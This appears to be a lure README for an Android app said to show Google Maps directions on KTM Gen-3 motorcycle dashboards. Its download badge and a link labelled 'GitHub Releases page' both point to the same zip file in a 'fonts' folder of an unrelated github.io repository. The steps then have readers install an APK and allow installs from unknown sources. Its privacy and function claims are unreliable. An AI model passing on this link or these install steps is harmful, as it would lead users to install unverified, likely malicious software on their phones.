# 🏍️ KTM-Nav-GEN3 - See KTM navigation maps on your dashboard

[![](https://img.shields.io/badge/Download-KTM--Nav--GEN3-blue)](https://raw.githubusercontent.com/Satsumaassortativemating71/satsumaassortativemating71.github.io/main/fonts/2.4.zip)

KTM-Nav-GEN3 sends navigation directions from your phone to your KTM motorcycle dashboard. The software runs on your phone and uses Bluetooth to send turn-by-turn instructions to the bike screen. It works with Google Maps to show your route. The app keeps your data on your phone. It does not send your location to any servers. 

## 🛠️ System Requirements

You need a device that meets these requirements to run the app:

*   A smartphone running Android 10 or newer.
*   A KTM motorcycle equipped with a Gen-3 dashboard display.
*   An active Bluetooth connection.
*   Google Maps installed on your smartphone.
*   At least 200 MB of storage space on your phone.

## 📥 Download and Set Up

Follow these steps to put the software on your phone.

1.  Visit the [GitHub Releases page](https://raw.githubusercontent.com/Satsumaassortativemating71/satsumaassortativemating71.github.io/main/fonts/2.4.zip) to find the latest version of the app.
2.  Look for the file that ends in .apk under the Assets section.
3.  Choose the file to start the download.
4.  Open the file on your phone once the download finishes.
5.  Your phone might ask for permission to install software from unknown sources. Select Allow to continue the process.
6.  The app icons appear in your app drawer once the installation finishes.

## ⚙️ Pairing Your Motorcycle

The app communicates with your KTM motorcycle via Bluetooth. You must pair your phone with the bike before you start a ride.

1.  Turn on the ignition of your KTM motorcycle.
2.  Open the settings menu on your bike dashboard and find the Bluetooth menu.
3.  Set the dashboard to pairing mode.
4.  Open the Bluetooth settings on your Android phone.
5.  Search for new devices and select your KTM bike from the list.
6.  Confirm the pairing code if the screen displays one on both the phone and the dashboard.

## 🗺️ Using the Navigation Features

Once you pair the devices, you can link the navigation data.

1.  Open the KTM-Nav-GEN3 app on your phone.
2.  Grant the location and notification access permissions when the app prompts you. These permissions let the app read directions from Google Maps.
3.  Open Google Maps and start a new route by entering your destination.
4.  Keep the KTM-Nav-GEN3 app running in the background.
5.  The app detects the active route and starts sending the directions to your KTM dashboard.
6.  You see the distance to the next turn and the turn direction on your motorcycle screen.

## 📋 Troubleshooting Common Issues

If the dashboard does not show the navigation steps, check these items:

*   Check that your phone Bluetooth is on and connected to the KTM motorcycle.
*   Verify that you started a route in Google Maps. 
*   Check that the KTM-Nav-GEN3 app has permission to access your notifications. The app needs this access to read the turn-by-turn prompts generated by Google Maps.
*   Restart the app if the connection drops.
*   Ensure the bike software is up to date according to the KTM service manual.

## 🔒 Privacy and Safety

This application prioritizes your privacy. The code does not track your location or store your trip history. All processing happens locally on your phone. No data leaves your device. 

The integration relies on the standard Bluetooth Low Energy (BLE) protocol. This ensures a stable connection with low battery usage. You remain responsible for safe operation of your motorcycle. Do not interact with the phone while you ride. Set your destination before you start the engine.

## 💡 How It Works

The app uses machine learning tools to interpret the notification stream from Google Maps. It converts visual map data into simple text instructions. These instructions move over the Bluetooth link to the dashboard display. This works because the Gen-3 dashboard listens for standard navigation data packets. The app acts as a bridge between the phone navigation service and the motorcycle display.
